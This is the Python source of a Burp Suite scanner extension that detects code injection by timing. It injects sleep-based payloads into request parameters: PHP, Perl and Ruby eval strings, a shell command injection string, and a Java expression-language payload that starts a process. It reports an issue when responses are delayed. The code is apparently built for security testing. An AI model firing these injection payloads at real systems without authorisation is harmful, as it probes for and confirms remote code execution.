from burp import IBurpExtender, IScannerInsertionPointProvider, IScannerInsertionPoint, IParameter, IScannerCheck, IScanIssue
import jarray, pickle, random, re, string, time
from string import Template
from cgi import escape


callbacks = None

class BurpExtender(IBurpExtender):
    
    def	registerExtenderCallbacks(self, this_callbacks):
        global callbacks
        callbacks = this_callbacks
    
        callbacks.setExtensionName("CodeInjection")
        
        # Register code injection component
        callbacks.registerScannerCheck(CodeInjection(callbacks));
        
        print "Successfully loaded CodeInjection"
        return

class CodeInjection(IScannerCheck):
    def __init__(self, callbacks):
        self._helpers = callbacks.getHelpers()
        
        self._done = getIssues('Code injection')
              
        self._payloads = {
            # eval() injection
            'php':['{$${sleep($time)}}', "'.sleep($time).'", '".sleep($time)."', 'sleep($time)'],
            'perl':["'.sleep($time).'", '".sleep($time)."', 'sleep($time)'],
            'ruby':["'+sleep($time)+'", '"+sleep($time)+"'],
            
            # Exploits shell command injection into '$input' on linux and "$input" on windows: 
            'any':['"&timeout $time&\'`sleep $time`\''],
            
            # Expression language injection
            'java':['$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"timeout","$time"})).start()).getInputStream()))).readLine()}$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"sleep","$time"})).start()).getInputStream()))).readLine()}'],
        }
        
        # Used to ensure only appropriate payloads are attempted
        self._extensionMappings = {
            'php5':'php',
            'php4':'php',
            'php3':'php',
            'php':'php',
            'pl':'perl',
            'cgi':'perl',
            'jsp':'java',
            'do':'java',
            'action':'java',
            'rb':'ruby',
            '':['php','ruby','java'],
            'unrecognised':'java',
            
            # Code we don't have exploits for
            'asp':'any',
            'aspx':'any',
        }
       
    
    def doActiveScan(self, basePair, insertionPoint):
        #print "Code Attack " + insertionPoint.getInsertionPointName()
            
        # Decide which payloads to use based on the file extension, using a set to prevent duplicate payloads          
        payloads = set()
        languages = self._getLangs(basePair)
        for lang in languages:
            new_payloads = self._payloads[lang]
            payloads |= set(new_payloads)
        payloads.update(self._payloads['any'])
        
        # Time how long each response takes compared to the baseline
        # Assumes <4 seconds jitter
        baseTime = 0
        for payload in payloads:
            if(baseTime == 0):
                baseTime = self._attack(basePair, insertionPoint, payload, 0)[0]
            if(self._attack(basePair, insertionPoint, payload, 10)[0] > baseTime+6):
                print "Suspicious delay detected. Confirming it's consistent..."
                (dummyTime, dummyAttack) = self._attack(basePair, insertionPoint, payload, 0)
                if(dummyTime < baseTime+4):
                    (timer, attack) = self._attack(basePair, insertionPoint, payload, 10)
                    if(timer > dummyTime+6):
                        print "Code execution confirmed"
                        url = self._helpers.analyzeRequest(attack).getUrl()
                        if(url in self._done):
                            break
                        self._done.append(url)
                        return [CustomScanIssue(attack.getHttpService(), url, [dummyAttack, attack], 'Code injection', 
                        "The application appears to evaluate user input as code.<p> It was instructed to sleep for 0 seconds, and a response time of <b>"+str(dummyTime)+"</b> seconds was observed. <br/>It was then instructed to sleep for 10 seconds, which resulted in a response time of <b>"+str(timer)+"</b> seconds", 'Firm', 'High')]
              
        return None
        
    def _getLangs(self, basePair):
        ext = self._helpers.analyzeRequest(basePair).getUrl().getPath().split('.')[-1]
        if(ext in self._extensionMappings):
            code = self._extensionMappings[ext]
        else:
            code = self._extensionMappings['unrecognised']
        if(isinstance(code, basestring)):
            code = [code]
        return code
        
        
    def _attack(self, basePair, insertionPoint, payload, sleeptime):
        payload = Template(payload).substitute(time=sleeptime)
        
        # Use a hack to time the request. This information should be accessible via the API eventually.
        timer = time.time()
        attack = callbacks.makeHttpRequest(basePair.getHttpService(), insertionPoint.buildRequest(payload))
        timer = time.time() - timer
        print "Response time: "+str(round(timer, 2)) + "| Payload: "+payload
        
        requestHighlights = insertionPoint.getPayloadOffsets(payload)
        if(not isinstance(requestHighlights, list)):
            requestHighlights = [requestHighlights]
        attack = callbacks.applyMarkers(attack, requestHighlights, None)
        
        return (timer, attack)

 
class CustomScanIssue(IScanIssue):

    def __init__(self, httpService, url, httpMessages, name, detail, confidence, severity):
        self.HttpService = httpService
        self.Url = url
        self.HttpMessages = httpMessages
        self.Name = name
        self.Detail = detail
        self.Severity = severity
        self.Confidence = confidence
        print "Reported: "+name+" on "+str(url)
        return
    
    def getUrl(self):
        return self.Url
     
    def getIssueName(self):
        return self.Name
    
    def getIssueType(self):
        return 0
    
    def getSeverity(self):
        return self.Severity
    
    def getConfidence(self):
        return self.Confidence
    
    def getIssueBackground(self):
        return None
    
    def getRemediationBackground(self):
        return None
    
    def getIssueDetail(self):
        return self.Detail
    
    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        return self.HttpMessages
    
    def getHttpService(self):
        return self.HttpService


def getIssues(name):
    prev_reported = filter(lambda i: i.getIssueName() == name, callbacks.getScanIssues(''))
    return (map(lambda i: i.getUrl(), prev_reported))